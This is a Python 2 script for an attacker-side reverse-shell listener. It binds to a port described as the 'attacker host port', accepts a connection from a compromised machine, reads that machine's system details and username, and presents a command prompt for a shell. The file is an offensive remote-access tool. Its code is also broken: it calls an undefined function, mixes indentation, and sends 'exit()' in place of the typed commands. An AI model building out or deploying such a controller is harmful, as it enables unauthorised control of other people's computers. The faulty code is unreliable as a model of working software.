import socket, subprocess as sp,sys

def script_colors(color_type,text):
  color_end = '\033[0m'

  if color_type.lower() == "r" or color_type.lower() == "red":
    red = '\033[91m'
    text = red + text +color_end

  elif color_type.lower() == "lgray":
    gray = '\033[2m'
    text = gray + text + color_end

  elif color_type.lower() == "gray":
    gray = '\033[90m'
    text = gray + text + color_end

  elif color_type.lower() == "strike":
    strike = '\033[9m'
    text = strike + text + color_end

  elif color_type.lower() == "underline":
    underline = '\033[4m'
    text = underline + text + color_end

  elif color_type.lower() == "b" or color_type.lower() == "blue":
    blue = '\033[94m'
    text = blue + text + color_end

  elif color_type.lower() =="g" or color_type.lower() == "green":
    green = '\033[92m'
    text = green + text + color_end

  elif color_type.lower() =="y" or color_type.lower() == "yellow":
    yellow = '\033[93m'
    text = yellow + text + color_end
  
  else :
    return text

  return text


###console code#####
def console(connection, address):
  print script_colors("g", " [ Info ] ") + script_colors("b","Connection Established from %s\n" % (address))

  sysinfo = connection.recv(2048).split(",")

  x_info = ''
  x_info += script_color("g","Operating System: ") +"%s\n" % (script_colors("b",sysinfo[0]))
  x_info += script_color("g","Computer Name: ") +"%s\n" % (script_colors("b",sysinfo[1]))
  x_info += script_color("g","Username: ") + "%s\n" % (script_colors("b",sysinfo[5]))
  x_info += script_color("g","Release Version: ") + "%s\n" % (script_colors("b",sysinfo[2]))
  x_info += script_color("g","System Version: ") + "%s\n" % (script_colors("b",sysinfo[3]))
  x_info += script_color("g","Machine Architecture: ") + "%s" % (script_colors("b",sysinfo[4]))

  user = sysinfo[5]+"@"+address

  while 1:
	  #Command to Enter On Server
    user = script_colors("underline",script_colors("lgray","%s" %(user) ))
    arrowRight = script_colors("lgray",">")+" ".strip() 
	  
    command = raw_input(user+" "+arrowRight)

    print "command received "+command
    
    connection.send("exit()")
    print script_colors("b", " [+] ") + script_colors("g","Shell Going Down")


#####main program execution#####
def main_control():
  try:
    host = sys.argv[1] 
    port = int(sys.argv[2]) #attacker host port
  
    print script_colors("g"," [+]") + script_colors("b"," Framework Standard Successfully")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Setup Socket

    s.bind((host,port)) #bind the socket
    s.listen(5) # Max Connections: 100


    if host == "":
      host = "localhost"

    print script_colors("g", " [info] ")+script_colors("b","Listening on %s%d ..."%(host,port))

    try:
      conn, addr = s.accept() #Accept the client Connection
      console(conn, str(addr[0]))
      s.close() #Close the socket

    except KeyboardInterrupt:
      print "\n\n "+ script_colors("red","[-]") + script_colors("b"," User Request An Interrupt")
      sys.exit(0)


  except Exception as e:
    print script_colors("red","[-]") + " Socket information not provided"

  


if __name__ == "__main__":
  main_control()


